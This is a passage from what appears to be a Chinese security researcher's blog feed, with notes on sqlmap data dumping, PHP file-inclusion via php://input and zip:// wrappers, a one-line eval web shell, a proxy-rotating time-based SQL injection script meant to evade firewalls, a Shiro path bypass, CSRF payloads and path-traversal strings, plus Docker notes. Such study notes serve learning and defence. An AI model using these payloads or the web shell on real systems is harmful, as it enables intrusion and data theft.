25);curl_setopt($ch,CURLOPT_USERAGENT, $useragent);curl_setopt($ch,CURLOPT_HTTPHEADER,array(&#39;Accept-Language: zh-cn&#39;,&#39;Connection: Keep-Alive&#39;,&quot;referer: $host&quot;));$return &#x3D; curl_exec($ch);echo $return;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>=====</p><pre class="line-numbers language-none"><code class="language-none">可以先--count下看看总的数据量，然后再查看特定的内容sqlmap -r ~&#x2F;Desktop&#x2F;11.txt -v 5 --technique E  --delay 3 --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080  --dbms&#x3D;MySql  --dbs --skip-waf --dump -T e_order -C id,bid,uid --start &lt;&gt; --stop &lt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>–force-ssl 强制https，在使用<code>-r</code>选项的时候非常有用</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php://input&amp;&amp;php://filter</title>
      <link href="/2016/12/28/php%E7%9A%84zip%E4%BC%AA%E5%8D%8F%E8%AE%AE.html"/>
      <url>/2016/12/28/php%E7%9A%84zip%E4%BC%AA%E5%8D%8F%E8%AE%AE.html</url>
      
        <content type="html"><![CDATA[<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p><pre class="line-numbers language-none"><code class="language-none">index.php:&lt;?php    $b&#x3D;$_REQUEST[&quot;b&quot;];    @include($b); ?&gt; EXP:GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input&lt;?php system(&quot;id&quot;)?&gt;获取文件内容：&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell另外一个php伪协议： file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php用来读取php文件。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p><h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p><pre class="line-numbers language-none"><code class="language-none">file.php:&lt;?php@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);@include($_GET[&#39;b&#39;].&quot;.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p><pre class="line-numbers language-none"><code class="language-none">shell.php:&lt;?php eval($_GET[&#39;c&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>a参数最终包含的是一个jpg，b参数是一个php</p><pre class="line-numbers language-none"><code class="language-none">对于a来说：mv shell.php shell.jpgzip a.zip shell.jpg访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();对于b来说：zip b.zip shell.php访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有下面这两个例子：第一个ctf比赛，第二个Metinfo5.3.10版本Getshell：<br><a href="http://www.venenof.com/index.php/archives/179/">http://www.venenof.com/index.php/archives/179/</a><br><a href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/</a></p><p>要注意Metinfo5.3.10里面zip的时候带了相对路径，%23后面并没有指定文件，因为压缩的时候带路径，解压缩会自动加上去。</p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sql代理注入</title>
      <link href="/2016/11/08/sql-proxy.html"/>
      <url>/2016/11/08/sql-proxy.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding: utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timetarget <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span><span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span><span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy<span class="token keyword">except</span> Exception<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token keyword">break</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p><p>实测还没测出来，感觉有点悬。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-6802</title>
      <link href="/2016/10/25/cve-2016-6802.html"/>
      <url>/2016/10/25/cve-2016-6802.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p></blockquote><p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p><pre class="line-numbers language-none"><code class="language-none">WebUtils.java+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;    contextPath &#x3D; &quot;&quot;; &#125; return contextPath;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p><p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker笔记</title>
      <link href="/2016/10/08/docker.html"/>
      <url>/2016/10/08/docker.html</url>
      
        <content type="html"><![CDATA[<ul><li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li><li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span><span class="token function">docker</span> run -t -i ubuntu /bin/bash<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span><span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span><span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span><span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>上面两个命令用一个命令代替：<span class="token function">docker</span> start -a -i e0521aa52895<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span><span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d<span class="token comment">#删除所有退出状态的容器</span><span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p><pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令docker exec web lsdocker start webdocker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p><pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2bzip2 -d -c &lt; img.tar.bz2 |docker loaddocker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p><pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04ENV ROOT_PATH &#x2F;rootRUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -yWORKDIR $ROOT_PATHRUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-fullWORKDIR &#x2F;root&#x2F;lnmp1.3-fullRUN echo -e 8e17f72 | bash install.shEXPOSE 80 3306 9000CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stopmysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;mysql -uroot -pupdate user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;FLUSH PRIVILEGES;quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后删除掉lnmp1.3.tar.gz和解压缩不必要的文件，最后保存推送到hub.docker.io，下次直接下载即可。</p><pre class="line-numbers language-none"><code class="language-none">docker commit ContainerID  user&#x2F;lnmp:tagdocker logindocker push ImageID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://www.keakon.net/2016/03/07/Docker%E5%AD%A6%E4%B9%A0%E5%90%8E%E8%AE%B0">https://www.keakon.net/2016/03/07/Docker学习后记</a></p>]]></content>
      
      
      <categories>
          
          <category> Learning </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《白帽子讲Web安全》</title>
      <link href="/2016/09/25/whitehat-talk-web-security.html"/>
      <url>/2016/09/25/whitehat-talk-web-security.html</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含漏洞（File-Inclusion）"><a href="#文件包含漏洞（File-Inclusion）" class="headerlink" title="文件包含漏洞（File Inclusion）"></a>文件包含漏洞（File Inclusion）</h3><p>文件包含可能会出现在JSP、PHP、ASP等语言中，常见的函数如下：<br><code>PHP: include()、include_once()、require()、require_once()、fopen()、readfile()</code></p><p>文件包含是PHP的一种常见用法，主要由四个函数组成：</p><ul><li>include()</li><li>require()</li><li>include_onec()</li><li>require_once()</li></ul><p>当使用这4个函数包含一个新的文件，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件是什么类型。</p><p>所以如果被包含的是txt文件，图片文件，远程URL等都会作为PHP代码执行。</p><p>能够打开并且包含本地文件的漏洞称为本地文件包含漏洞（Local File Inclusion，LFI）</p><p>PHP语言是由C语言实现的，因此使用了C语言中一些字符串处理函数，在连接字符串的时候，0字节（\x00）讲作为字符串结束符。所以攻击者可以加一个0字节，截断file变量后面的字符串，即<br><code>../../etc/passwd\0</code>，在get请求的时候进行Urlencode，变成<code>../../etc/passwd%00</code>。</p><p>如果禁用了0字节可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，Linux下4096字节会达到最大值，最大值长度之后的字符串将会被丢弃。可以通过如下构造:<br><code>../../../../../../../../../../../../../../abc</code></p><ul><li>%2e%2e%2f 等同于 ../</li><li>%2e%2e/ 同上</li><li>..%2f 同上</li><li>%2e%2e%5c ..\</li><li>%252%252%255c等同于..\</li></ul><p>open_basedir的作用是跨越目录读取文件的方法，当PHP配置open_basedir讲保护服务器，使得这种攻击无效。</p><p>关于这一点可以搜索P牛的文章，其中有绕过open_basedir。</p><p>如果PHP的配置选项allow_url_include为On的时候，则include/require函数可以加载远程文件，这种漏洞称为远程文件包含漏洞（Remote File Inclusion，RFI)。<br>远程文件包含漏洞可以直接执行任意命令，比如攻击者服务器有以下文件:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho system(&quot;ver;&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>远程文件包含之所以可以执行命令，因为攻击者可以自定义被包含的文件内容，因此本地文件包含漏洞想要执行命令，需要找到一个攻击者可以控制内容的本地文件。</p><ul><li>用户文件上传</li><li>包含data:// 或php://input等伪协议</li><li>包含Session文件</li><li>包含日志文件</li><li>包含/proc/self/environ文件</li><li>包含上传的临时文件</li><li>包含其它应用创建的文件，比如数据库文件，缓存文件，应用日志等</li></ul><p>包含日志文件是比较通用的技巧，因为服务器一般会往Web Server的access_log记录客户端的请求信息，在error_log记录出错请求。因此攻击者可以间接讲PHP代码写入到日志文件中，在文件包含的时候，包含即可执行。</p><p>如果网站访问量比较大，php可能会僵死，但Web Server往往滚动生成日志，因此在凌晨包含日志文件讲提高攻击的成功性。</p><p>PHP创建的上传临时文件，往往处于PHP允许访问的目录内，包含这个临时文件，PHP会为上传文件创建临时文件，其目录在php.ini的upload_tmp_dir中定义，但该值默认为空，在Linux中会使用/tmp目录，在windows中使用C:\windows\temp目录。这个例子可以查看<code>wooyun-2015-134185 Chroa的文件包含漏洞</code></p><h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4><p>变量如果未被初始化，且能被用户所控制，那么很可能会导致安全问题。</p><ul><li>extract() 变量覆盖</li><li>遍历初始化变量</li><li>import_request_variables变量覆盖</li><li>parse_str()变量覆盖</li></ul><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>文件包含可以造成代码执行，popen(),system(),passthru(),exec()等可以直接执行系统命令。<br>可以执行代码的函数：<code>eval(),assert(),system(),exec(),shell_exec(),passthru(),escapeshellcmd(),pcntl_exec()</code></p><h3 id="与安全有关的php-ini配置"><a href="#与安全有关的php-ini配置" class="headerlink" title="与安全有关的php.ini配置:"></a>与安全有关的php.ini配置:</h3><h4 id="register-globals"><a href="#register-globals" class="headerlink" title="register_globals"></a>register_globals</h4><p>当register_globals为on的时候，php不知道变量从何而来，容易出现变量覆盖的问题。因此强烈建议设置register_globals = OFF，这个也是新版本中的默认配置。</p><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>open_basedir限制PHP只能操作指定目录下的文件，在对抗文件包含，目录遍历等攻击的时候非常有用，如果设定的值是一个指定的目录需要在最后加上一个<code>/</code>，否则会认为是该目录的前缀</p><h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>对抗远程文件包含，同时还有allow_url_fopen, allow_url_include</p><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>推荐关闭，在开启的时候回在特殊字符前加<code>\</code>进行转义</p><h4 id="cgi-fix-pathinfo"><a href="#cgi-fix-pathinfo" class="headerlink" title="cgi.fix_pathinfo"></a>cgi.fix_pathinfo</h4><p>PHP以CGI的方式安装，则需要关闭此项，以避免出现文件解析的问题。</p><h4 id="session-cookie-httponly"><a href="#session-cookie-httponly" class="headerlink" title="session.cookie_httponly"></a>session.cookie_httponly</h4><p>开启HttpOnly</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2016/08/29/csrf.html"/>
      <url>/2016/08/29/csrf.html</url>
      
        <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p><p>如果要跨域请求，有下面的限制：</p><ul><li>仅允许GET、HEAD、POST请求</li><li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li><li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li></ul><p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p><ul><li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li></ul><blockquote><p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p></blockquote><ul><li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li></ul><blockquote><p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:var xhr &#x3D; new XMLHttpRequest();xhr.open(&#39;GET&#39;, url, true);xhr.withCredentials &#x3D; true;xhr.onreadystatechange &#x3D; handler;xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">JQuery:$.ajax(&#123;&#39;url&#39;: url,&#39;type&#39;: &#39;GET&#39;,&#39;xhrFields&#39;: &#123;&#39;withCredentials&#39;: true&#125;,&#39;success&#39;: handler&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Access-Control-Request-Method 和 Access-Control-Allow-Methods声明所允许的HTTP methods，普通的跨域请求只支持GET、HEAD和POST方法，想用其他方法的话需要将<code>Access-Control-Request-Method</code>设置为DELETE等其他方法，则返回的<code>Access-Control-Allow-Methods</code>中返回所有支持的方法</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>两种类型：GET POST</p><p>GET:</p><pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;delete&#x2F;id &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POST:利用自动提交表单</p><pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;http:&#x2F;&#x2F;wooyun.org&#x2F;add  method&#x3D;POST&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot;&gt;&lt;&#x2F;form&gt;&lt;script&gt; document.forms[0].submit();&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常见防御有两种：检查Referer和使用token，如果同域下存在xss，除了验证码，其他都无法防御这个问题。</p><p>程序后端可能使用REQUEST方式接受，但是程序默认使用POST，所以改为GET请求也可以。</p><p>当采用Refer防御的时候，可以把请求中的这个字段修改如下：</p><pre class="line-numbers language-none"><code class="language-none">原始Refer： http:&#x2F;&#x2F;test.com&#x2F;index.php绕过之后：http:&#x2F;&#x2F;test.com.attack.com&#x2F;index.phphttp:&#x2F;&#x2F;attack.com&#x2F;test.com&#x2F;index.php[空]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>CSRF攻击会根据不同场景，大到垂直越权，这些场景的攻击都是<strong>跨域请求</strong>，并且比较重要的都是在受害者身份得到认证的以后发生的。</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>GET型的<code>CSRF</code>（带src属性的HTML标签都可以跨域发起GET请求）:</p><pre class="line-numbers language-none"><code class="language-none">&lt;link href&#x3D;&quot;…&quot;&gt;&lt;img src&#x3D;&quot;…&quot;&gt;&lt;iframe src&#x3D;&quot;…&quot;&gt;&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0; url&#x3D;…&quot;&gt;&lt;script src&#x3D;&quot;…&quot;&gt;&lt;video src&#x3D;&quot;…&quot;&gt;&lt;audio src&#x3D;&quot;…&quot;&gt;&lt;a href&#x3D;&quot;…&quot;&gt;&lt;table background&#x3D;&quot;…&quot;&gt;…<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POST请求，则必须使用表单提交的方式，这些标签可以使用JavaScript动态生成：</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;    new Image().src&#x3D;&#39;http:&#x2F;&#x2F;wooyun.org&#x2F;csrf&#39;;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>###POST类型的CSRF</p><ul><li>foms’ method is limited to GET and POST</li><li>form’s POST message is limited to the three formats <ul><li>application/x-www-form-urlencode</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li>with the form data encodeing text/plain it is still possible to forge requests containg valid json data.</li></ul><blockquote><p>The POST body of an HTML form’s request is always either <code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>, or <code>text-plain</code>。</p></blockquote><p>现在考虑下有一个对于post请求，其中body是json格式，服务端校验<code>Content-Type: 